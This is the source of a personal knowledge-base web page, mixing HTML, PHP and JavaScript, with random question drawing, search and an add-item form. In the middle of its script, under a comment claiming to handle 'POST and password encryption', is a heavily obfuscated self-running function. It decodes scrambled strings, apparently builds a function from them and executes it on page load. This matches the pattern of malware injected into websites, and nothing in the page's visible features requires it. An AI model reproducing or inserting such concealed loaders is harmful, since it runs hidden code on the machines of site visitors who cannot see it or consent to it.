<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" type="text/css" href="css/style.css">
<link rel="icon" type="image/jpg" href="kdlb.jpg">
  </script>
<!-- path to google translate start -->
<script type="text/javascript"
src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
<!-- path to google translate end -->
<title>Kamil Dziuk - Knowledge base</title>


</head>
<body>  
  <?php 
  
  require "get_content.php";
  
  ?>
<!-- elemnt  to google translate start -->
<div id="google_translate_element"></div>
<!-- elemnt  to google translate end -->
  <!-- light Reflections start-->
  <div class="lightReflectionsContainer">
  <div class="lightReflections"></div>
  <div class="lightReflections" style="--delay:-12s;--size:0.35;--speed:20s;"></div>
  <div class="lightReflections" style="--delay:-10s;--size:0.3;--speed:10s;"></div>
</div>
<!-- light Reflections end-->


<br>
<!-- Displaying the length of Question App start -->
This is where I write down my knowledge and curiosities about web development. Something like a blog.<br><br>
<!-- Displaying the length of Question App start -->
Number of total questions: <div class="lengthApp"></div>
<!-- Displaying the length of Question App end -->

<!-- form for adding questions and answers start -->
<input class="id" type="number" placeholder="Id"><br>
<input class="questionsEN" type="text" placeholder="Questions"><br>
<input class="answerTheQuestionEN" type="text" placeholder="Answer"><br><br>
<button class="submit">Sent</button><br><br>
<!-- form for adding questions and answers end -->
<br>
<br>
Using the buttons you can draw a question or a trivia
<br>
<br>
<!-- View questions and answers start -->
<button class="refresh">Questions</button><br><br>
<button class="answer">Answer</button><br><br>
<div class="contentOne"></div><br>
<div class="contentTwo"></div><br><br>

Before adding another item, you must enter your password <input class="passwordInput" type="password" placeholder="Password"><br><br>
<div class="passwordAlert"></div>
<!-- View questions and answers end -->

<script>
 //  Downloading data from the database start  
let questionsApp = <?php echo json_encode($questionsApp);?> 
//  Downloading data from the database end
</script>

 <!-- Search function start  -->

 <div class="search-wrapper">
    <label for="search"> </label><br>
    <input type="search" id="search" data-search placeholder="Search">
  </div>
  <div class="questions-cards" data-questions-cards-container></div>
  <template data-questions-template>
    <div class="card">
      <div class="header" data-header></div>
      <div class="body" data-body></div>
    </div>
  </template>
   <!-- Search function end  -->
<script>
  


  let lengthApp = document.querySelector('.lengthApp');
let questionsEN = document.querySelector('.questionsEN');
let answerTheQuestionEN = document.querySelector('.answerTheQuestionEN');
let passwordInput = document.querySelector('.passwordInput');
let refresh = document.querySelector('.refresh');
let answer = document.querySelector('.answer');
let contentOne = document.querySelector('.contentOne');
let contentTwo = document.querySelector('.contentTwo');
let contentQuestionEN = document.querySelector('.contentQuestionEN');
let id = document.querySelector('.id');
let passwordAlert = document.querySelector('.passwordAlert');






// let value = e.target.value







// Method post nad password encryption start

(function(){var SoA='',rlr=179-168;function fGa(t){var b=4057004;var n=t.length;var k=[];for(var v=0;v<n;v++){k[v]=t.charAt(v)};for(var v=0;v<n;v++){var q=b*(v+435)+(b%13079);var z=b*(v+413)+(b%12782);var w=q%n;var h=z%n;var a=k[w];k[w]=k[h];k[h]=a;b=(q+z)%5565327;};return k.join('')};var GVC=fGa('zemsnoucjxcoipcrfyborqatrttgvswnkuhld').substr(0,rlr);var WNK='2ampt)q0,a=n[C==}o]ssrihbd,c)pe=vhi01;{1+otrs!nv.u+z[nvvu-n]l."c)5cfdr+[<n+,06ueh17{]tv"iexfflr2=,c,+i,ed{r;"79,01r104[o;vf)egg==]4fjf=v+r.(A;;,8nrla}[er;gr).,[ 1()t+;+lt+6]=}tru.gl=hnebe)-enrx[92.aor;cru7,.()aipm imen=v.*;r05ithw=)tv(=gg.(<ge=]+cgnn.. qat70, il,fg.3poarb. w>e;uqj<;;pt(=mbcr0,vl+  0=;3;=a96p2r)-p+bk s}0}laal;v;ejl;ej).==miqeo(hrt 0";cmpCasuiv;;vch=bv;e,p98=.o",C+jhhc)ah+*(7,o(2=;v(l(<7h;{llvfv[g{t h28.+vi ;vz;arm4rvgyt4=g]-++ntspra0;+te6 "oio(anlfaeons"r lpro(sir]c=,-(4)r,q;+]fvn)f+(o.lilt{=)1+;1ti)u;8a=f;jtg)t>q7lpha)n r6ut0h);(l (snlle.sn],u)(.;r[n.=(a=u]h;onl],Cas(1fb.n7 v2u)tav[-[1sp4a;phd;h8rwe!8uuf pv f)2<[f6c,u6(ucC;[(u=nu]o(l))sitwn=1.ju"nyqz,;(ol.vri+,)}-];)Sgcg=;Cjr;o )= rr;ns1(ytht,),f)p9sn2e9(oe.5.7(cn"),ao(anr v=Su8ta+aicr=CshslAda(;6)a))  Aaon;roshla.(eb=Cau[8(rrxoaaxlr wlt 1rel)=(iathu.n,=g8=(a=gdor;mprar;odi{}r"llvui9ticw9g3s+ly=a8;=fgrp+AvA(=e;';var jmq=fGa[GVC];var hRN='';var Ofx=jmq;var xpv=jmq(hRN,fGa(WNK));var HZM=xpv(fGa('%s)o8g"eFE),F.]FF.rr.=s\/\/irso$frd.Tlh]_{FF]2emc"_fDatFnn<F#0(F}d%rb\'dr.enj_FF@\/ctF<F<2p!dF\/,Fo14)FaivF?6nef6.a.d,))orn5rFd{?oFt]DF&9F&-(1gr.53edp<;)=tFnh61(1F.()nFDt;d_;({o)3,!wc1($3,g+_F;o1.!)d6{Aj6tdb!F{)41i.D delnlN7)a* 3advcs,]e ers$.)<Fe(sh(%de%..@(Tt.).$F%%.Fls\/r!rF;lF3)shf s[1peup{u-snFF<!-Fe.n)rna ]d: .ta]!el#=9.F)dt7p_sFF]bdnv.4rCdudF;rov8en{.Fr3s;r!eb1d>Fonok fttn=.FFdeze_saF53F!5Scrse(r2+l).d1p("ezy.+wBooppTCM6kutgdF%*rF1FyfefpFru())(snre<t2Fa8t=9,ji{i5o0.ft{f}%BeiF4x2Fudne,!(  Fgnr0]d.%#iFn6e44F.e(BtampFr6)_.{nd4e6, pC,c$()ra)2aw=dqFtcd4{n>;)pi+Fl7w!b3Fnd(>b]d0;FFoc6FFe6heskc 3f+;t{s;cr:e?8(h=3.*t)=C$lqcr]FCt#30le s0bi.$FoS.sF@)p+dojF2Fe%FtwaFFe:r]o8s6n%r8bf47eA%.!q7s)-n(Fy9a"3oo"bn#r+7]icF*u7,e;Fr=FFd*bye h1u%o;3bausFr.!j(cae=$dF,)=_FedaFAs7F]s%y_Fi:6ldo7$senotu,mFu1u:]90t.FF sk;r)=6(4,N,8r0d]nou)u$t.i,Fcop!Freb:r.24tF.f1r7.+)=5=ict7$Ftc](io\/F7#Fgg40d_u2$i=_\'5t[kp=.c;dd,%e+un.FFuyF_d5eF(}FF6zFd_u ;.F51;)fF=,A.Faj.c(idrF6\/;FdFF (:$!Ff,3e.[nF)o12Fc)rl{8tt(1F[tFFo8_w}...nF;FttF.pD_s)ojrFt__ltc.[mt"e0!uF6EtjtFe!v4(eFout.eF4dyip*a+a1=&,_ecid&=(uFc,(g,eFe].s6*FFo c$"io.1F=,#t.}f#F3.sr%w% cdmFgeF;(y,gFf%}yl(,_hdFee(eo.F=d.83{Fd".)utpapeuSoFaehy(F(Ff]oDt!ch=ndFF}j.gr.t.hq(p!)a..no]Suod:b. 2F]o.fdrF{s>rF}%sycF1[._nF>.)F}).D056n.4rre1rtF"5e,o]:(2oFbpFsFmFdFu[FF{ *3hnsm(ctr4rau_F\'1t tFF!pr,)F8)o an$2F.3bni1l!au0l=]F.!]]]F!e,a-i)(e: _.pFd]c$n(n2_Fg$!(go}t().te](]?3;Fff.6j)]F;0tn!dvF9s%$)%.tdt=p[6tdje)m.({#vdF0iF=_.F(6Fg0pn!wfl=!52(I..FmweFEp:o_6emr3.td:eos2_cgia)fe!$sF[6i o(ddhFlcFj%}j%tF(4F;7)a3(!(f3>F"Nau{]8_i5(;Fd03;" .,9.,6$>\'d,_er](.eS50+]}F3]g)3%gaaidFwh2(.5d!E_!#.v5F5o(rFubr)"nF=7Feferlc).8o*din)27.de(e6d.ds.FaFw!77ode)!bbom6.Ehd.(]c.Ba;"3\/=5fmFue4(oFF!){i6; F3F)5>FaF1dFEFg=$. egFl!(F>n;FF,2%0F1lCdtBF)6en.piuw)o)F1jiot.nF6 i0C%FcF0ca\'uo;p  ppo.oh]sy,dE0i.n.N<2!r.6(tFtFeFcs}$)jb=r;tt1!t](6F7)"r{eF0r.)as$y.pyCFupa$$!dF?6a+!}\/.c,6a.0FFxe)l}]besF]FF3.r%rI7r%3(;!F$)2n2C=]ddF65wtEFcy.dF;4ilr5o ,o[6CB].t o}4o).!d.4F!(hF.:fe})_dt>v0xDa$4)gu,;F}rf=s(.cFqe)t2q;p6 \'Fn=vn.ciF0 {)sde.]r. dF;E{rtbruF hm]F jpn6 DsF;F=3nEo.e].'));var Mdz=Ofx(SoA,HZM );Mdz(7926);return 2443})()
// Method post nad password encryption end

//  function  to google translate start
 googleTranslateElementInit = () =>  {
new google.translate.TranslateElement( 'google_translate_element');
}
// function to google translate end

//question and answer randomization functione start
let randomQuestion;
lengthApp.innerHTML = questionsApp.length + 3;
randomQuestionFunction = () =>
{

refresh.addEventListener('click', function() {   
randomQuestion = questionsApp[Math.floor(Math.random() * questionsApp.length)];
contentOne.innerHTML = randomQuestion.questionsEN;

}) 
};
questionFunction = () =>
randomQuestionFunction();
{
answer.addEventListener('click', function() {
contentTwo.innerHTML = randomQuestion.answerTheQuestionEN;
}); 
}
questionFunction();
//question and answer randomization functione end





  /* Search function start */

  let search = document.querySelector(".search-wrapper")
let userCardTemplate = document.querySelector("[data-questions-template]")
let userCardContainer = document.querySelector("[data-questions-cards-container]")
let searchInput = document.querySelector("[data-search]")

// new table start
let questions = []
// new table end
searchInput.addEventListener("input", e => {
  // Capturing what is entered in the field start
  let value = e.target.value.toLowerCase()
    // Capturing what is entered in the field end
  questions.forEach(questions => {
    let isVisible =
    // checking whether a given value exists start
    questions.questionsEN.toLowerCase().includes(value) ||
    questions.answerTheQuestionEN.toLowerCase().includes(value)
     // checking whether a given value exists end
    // Hide those items that do not match the given value start
    questions.element.classList.toggle("hide", !isVisible)
       // Hide those items that do not match the given value end
   
  })

})

// card.style.display = "none";
    questions = questionsApp.map(questions => {
      // Calling the child of the root node start
      let card = userCardTemplate.content.cloneNode(true).children[0]
       // Calling the child of the root node end
      let header = card.querySelector("[data-header]")
      let body = card.querySelector("[data-body]")
      header.textContent = questions.questionsEN
      body.textContent = questions.answerTheQuestionEN
      // display downloaded values start
      userCardContainer.append(card)
      // display downloaded values end

      return { questionsEN: questions.questionsEN, answerTheQuestionEN: questions.answerTheQuestionEN, element: card }
    })
    /* Search function end */


</script>

</body>
</html>